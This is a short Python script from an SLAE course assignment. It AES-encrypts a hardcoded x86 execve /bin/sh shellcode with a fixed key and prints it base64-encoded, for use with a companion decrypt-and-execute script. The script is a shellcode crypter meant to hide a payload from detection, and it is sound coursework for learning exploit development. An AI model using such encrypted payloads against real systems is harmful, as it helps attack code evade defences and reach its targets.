#!/usr/bin/env python


# SLAE - Assignment 7 - Shellcode Encrypter
# Python script to encrypt provided shellcode using AES
# Author: Billy (@_hAxel)


import base64

from Crypto import Random
from Crypto.Cipher import AES

BS = 16
pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
unpad = lambda s : s[0:-ord(s[-1])]

shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x50\x53\x89\xe1\xb0\x0b\xcd\x80" #/bin/sh Shellcode

class AESCipher:

    def __init__( self, key ):
        self.key = key

    def encrypt( self, raw ):
        raw = pad(raw)
        iv = Random.new().read( AES.block_size )
        cipher = AES.new( self.key, AES.MODE_CBC, iv )
        return base64.b64encode( iv + cipher.encrypt( raw ) )


cipher = AESCipher('mysecretpassword')
encrypted = cipher.encrypt(shellcode)
print encrypted #prints Encrypted and Base64 encoded shellcode to be used with SLAEdecryptAndExecute.py
